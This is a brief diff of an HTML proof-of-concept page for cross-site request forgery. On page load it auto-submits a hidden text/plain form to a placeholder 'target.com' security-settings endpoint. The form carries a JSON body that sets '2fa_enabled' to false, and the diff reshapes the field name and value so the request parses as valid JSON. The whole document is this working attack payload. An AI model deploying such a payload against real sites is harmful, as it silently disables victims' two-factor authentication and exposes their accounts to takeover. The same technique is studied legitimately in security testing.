@@ -14,7 +14,7 @@ multipart/form-data
 <script>
 $(document).ready(function() {
     // Dynamically update the value of the hidden input
-    $("#z").val(JSON.stringify({ "2fa_enabled": false }));
+    $("#z").val(JSON.stringify({ "2fa_enabled": false,"fakeparam":"');
     
     // Automatically submit the form when the page loads
     $("#f").submit();
@@ -23,7 +23,7 @@ $(document).ready(function() {
 </head>
 <body>
 <form id="f" enctype="text/plain" action="https://target.com/api/settings/security" method="post">
-    <input id="z" type="hidden" name="data" value=''> 
+    <input id="z" type="hidden" name="data" value='test"}'> 
     <input type="submit" value="send">
 </form>
 </body>
